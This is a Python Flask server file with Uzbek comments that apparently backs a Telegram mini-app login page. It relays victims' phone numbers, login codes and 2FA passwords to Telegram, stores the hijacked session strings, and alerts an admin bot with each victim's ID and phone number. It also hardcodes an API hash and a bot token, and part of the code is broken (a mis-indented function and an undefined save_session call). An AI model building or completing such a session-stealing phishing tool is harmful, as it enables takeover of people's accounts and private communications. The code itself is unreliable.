import os
import asyncio
import threading
from flask import Flask, request, jsonify, render_template

from telethon import TelegramClient
from telethon.errors import (
    FloodWaitError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    SessionPasswordNeededError
)

from aiogram import Bot
from database import get_db, init_db


# =====================
# CONFIG
# =====================
API_ID = 25780325
API_HASH = "2c4cb6eee01a46dc648114813042c453"

ADMIN_BOT_TOKEN = "8455652640:AAE0Mf0haSpP_8yCjZTCKAqGQAcVF4kf02s"
ADMIN_ID = 515902673

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SESSIONS_DIR = os.path.join(BASE_DIR, "sessions")
os.makedirs(SESSIONS_DIR, exist_ok=True)

# =====================
# INIT
# =====================
app = Flask(__name__, template_folder="templates")
bot = Bot(ADMIN_BOT_TOKEN)
init_db()

# phone -> phone_code_hash
pending_codes = {}


# =====================
# ASYNC HELPER
# =====================
def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()


# =====================
# ADMIN NOTIFY
# =====================
def notify_admin(user_id: int, phone: str, username: str | None):
    async def _send():
        text = (
            "🔐 Yangi login\n\n"
            f"👤 User ID: {user_id}\n"
            f"📱 Telefon: {phone}\n"
        )
        if username:
            text += f"👤 Username: @{username}"

        await bot.send_message(ADMIN_ID, text)

    threading.Thread(
        target=lambda: asyncio.run(_send()),
        daemon=True
    ).start()


# =====================
# ROUTES
# =====================
@app.route("/")
def index():
    return "LOGIN SERVER ISHLAYAPTI"


@app.route("/miniapp")
def miniapp():
    return render_template("login.html")


# =====================
# SEND CODE
# =====================
@app.route("/send_code", methods=["POST"])
def send_code():
    data = request.json
    phone = data.get("phone")

    async def _send():
        client = TelegramClient(
            os.path.join(SESSIONS_DIR, phone.replace("+", "")),
            API_ID,
            API_HASH
        )
        await client.connect()
        result = await client.send_code_request(phone)
        await client.disconnect()
        return result

    try:
        res = asyncio.run(_send())

        # 🔴 MUHIM: HASH SAQLAYMIZ
        pending_codes[phone] = res.phone_code_hash

        print("SEND_CODE HASH:", res.phone_code_hash)

        return jsonify({
            "status": "ok",
            "message": "Kod yuborildi"
        })

    except Exception as e:
        return jsonify({
            "status": "error",
            "message": str(e)
        })

# =====================
# VERIFY CODE
# =====================
@app.route("/verify_code", methods=["POST"])
def verify_code():
    data = request.json
    phone = data.get("phone")
    code = data.get("code")

    phone_code_hash = pending_codes.get(phone)
    if not phone_code_hash:
        return jsonify({
            "status": "error",
            "message": "Kod muddati tugagan. Qayta yuboring."
        })

    async def _verify():
    client = TelegramClient(
        os.path.join(SESSIONS_DIR, phone.replace("+", "")),
        API_ID,
        API_HASH
    )
    await client.connect()

    await client.sign_in(
        phone=phone,
        code=code,
        phone_code_hash=phone_code_hash
    )

    me = await client.get_me()  # 🔥 ENG MUHIM QATOR

    session_str = client.session.save()  # 🔥 SESSION
    save_session(me.id, session_str)     # 🔥 DB GA YOZAMIZ

    await client.disconnect()

    try:
        asyncio.run(_verify())

        # 🔥 ISH BITDI — HASHNI O‘CHIRAMIZ
        pending_codes.pop(phone, None)

        return jsonify({
            "status": "ok",
            "message": "Login muvaffaqiyatli"
        })

    except SessionPasswordNeededError:
        return jsonify({
            "status": "2fa_required"
        })

    except Exception as e:
        return jsonify({
            "status": "error",
            "message": "Kod noto‘g‘ri yoki eskirgan"
        })


# =====================
# VERIFY 2FA PASSWORD
# =====================
@app.route("/verify_password", methods=["POST"])
def verify_password():
    data = request.json
    phone = data.get("phone")
    password = data.get("password")

    async def _verify():
        client = TelegramClient(
            os.path.join(SESSIONS_DIR, phone.replace("+", "")),
            API_ID,
            API_HASH
        )
        await client.connect()
        await client.sign_in(password=password)
        me = await client.get_me()
        await client.disconnect()
        return me

    try:
        me = asyncio.run(_verify())

        # ✅ LOGIN MUVAFFAQIYATLI → DB ga yozamiz
        conn = get_db()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO authorized_users (user_id, phone, username)
            VALUES (%s, %s, %s)
            ON CONFLICT (user_id) DO NOTHING
        """, (me.id, phone, me.username))
        conn.commit()
        conn.close()

        return jsonify({
            "status": "ok",
            "message": "Login muvaffaqiyatli"
        })

    except Exception as e:
        print("VERIFY_PASSWORD ERROR:", repr(e))
        return jsonify({
            "status": "error",
            "message": "Parol noto‘g‘ri"
        })

# =====================
# RUN
# =====================
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
